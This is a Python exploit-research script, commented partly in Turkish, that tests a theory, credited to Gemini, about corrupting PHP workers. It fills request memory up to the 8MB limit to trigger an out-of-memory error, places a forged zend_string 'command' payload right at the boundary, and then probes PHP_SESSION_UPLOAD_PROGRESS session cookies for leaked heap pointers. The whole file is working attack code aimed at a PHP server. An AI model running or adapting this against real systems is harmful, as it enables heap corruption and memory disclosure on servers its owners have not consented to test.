#!/usr/bin/env python3
"""Gemini 'komut konumu' teorisi testi (Senaryo C: Tam İsabet).

Teori: filler ile RAM'i ~7.99MB'a doldur, payload'ı TAM 8.00MB sınırına koy.
PHP tam o noktada OOM olur, hatalı temizlik payload'ın üzerine basar → corrupt worker.

Test: filler size vary (7.0 → 8.1MB), payload filler'ın hemen ardından.
Sinyal: OOM status (500) + worker corrupt mi (leak read → heap data).

Usage:
  python3 bf_position.py --port 18113
"""
from __future__ import annotations
import argparse
import struct
import time

from common import (Target, build_multipart, parse_cookie,
                    count_heap_pointers)


def leak_probe(t: Target) -> tuple[int, int, int]:
    """Simple session-init probe → cookie len + heap ptr count."""
    parts = [
        {"name": "PHPSESSID", "data": b"attacksessionid0001"},
        {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
    ]
    body = build_multipart(parts, b"BNDRY12345")
    st, raw = t.post_chunked(body, b"BNDRY12345", read_cap=1 << 20)
    cookie = parse_cookie(raw)
    base, cnt = count_heap_pointers(cookie, ~0x1FFFFF)
    return st, len(cookie), cnt


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--host", default="192.168.8.123")
    ap.add_argument("--port", type=int, default=18113)
    args = ap.parse_args()

    t = Target(args.host, args.port, verbose=False)
    bnd = b"S" * 17
    # Filler sizes in MB — payload goes right after (at the boundary)
    filler_mb = [7.0, 7.25, 7.5, 7.75, 7.9, 7.95, 7.98, 7.99, 8.0, 8.01, 8.05, 8.1]

    print(f"{'filler':>7} | {'stOOM':>6} | {'stPrb':>6} | {'cookie':>8} | "
          f"{'cnt':>4} | signal", flush=True)
    print("-" * 60, flush=True)

    for fm in filler_mb:
        filler_bytes = int(fm * 1024 * 1024)
        # Filler + payload (small command field) right at the boundary
        parts = [
            {"name": "PHPSESSID", "data": b"\x00"},
            {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
            {"name": "filler", "data": b"B" * filler_bytes},
            # payload: forged zend_string (the "command") right after filler
        ]
        forge = bytearray(b"A" * 79)
        struct.pack_into("<Q", forge, 0x10, 0x1000)
        forge[0x18] = ord("L")
        parts.append({"name": "cmd", "data": bytes(forge)})

        body = build_multipart(parts, bnd)
        st, _ = t.post_chunked(body, bnd, read_cap=1 << 20)
        time.sleep(0.15)

        # Probe: is the worker corrupted?
        st2, clen, cnt = leak_probe(t)
        signal = "LEAK!" if (clen > 100 and cnt >= 8) else (
            "big" if clen > 100 else "clean")
        print(f"{fm:>7.2f} | {st:>6} | {st2:>6} | {clen:>7}B | {cnt:>4} | {signal}",
              flush=True)
        time.sleep(0.1)

    print("-" * 60, flush=True)
    return 0


if __name__ == "__main__":
    import sys
    sys.exit(main())
